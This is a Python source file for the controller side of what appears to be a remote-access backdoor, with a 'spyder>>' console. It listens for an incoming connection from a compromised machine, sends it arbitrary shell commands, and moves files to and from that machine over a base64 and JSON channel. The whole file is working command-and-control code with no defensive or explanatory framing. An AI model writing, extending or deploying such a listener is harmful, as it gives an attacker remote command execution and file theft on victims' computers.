import socket
import json
import base64
import time
from address import IP_ADDR, PORT


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, self.addr = listener.accept()
        print("[+] Connection established with "+str(self.addr))

    def execute(self, command):
        self.reliable_send(command)
        return self.reliable_recv()

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_recv(self):
        json_data = b''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError or json.decoder.JSONDecodeError:
                continue

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return b'[+] Downloaded the requested file successfully'

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def start(self):
        while True:

            command = input("spyder>> ").split(" ")
            if command[0] == 'exit':
                self.reliable_send('exit') #send the exit signal before 
                time.sleep(2)
                self.connection.close()
                exit()

            if command[0] == 'upload' and len(command) > 1:
                path = ' '.join(command[1:])
                try:
                    content = self.read_file(path).decode('ISO-8859-1')
                    command.append(content)
                    result = base64.b64decode(self.execute(command))
                except FileNotFoundError:
                    result = b'[X] File to be uploaded does not Exists'
                except IsADirectoryError:
                    result = ('[X] Failed to upload. "'+path+'" is a directory').encode()
            else:
                result = base64.b64decode(self.execute(command))

            if command[0]=='download' and len(command) > 1:
                if base64.b64decode(result)[:4] != b'[X] ':
                    path = ' '.join(command[1:])
                    result = self.write_file(path, result)
                else:
                    result = base64.b64decode(result)
                    
            print(result.decode('ISO-8859-1'))

my_listener = Listener(IP_ADDR, PORT)
my_listener.start()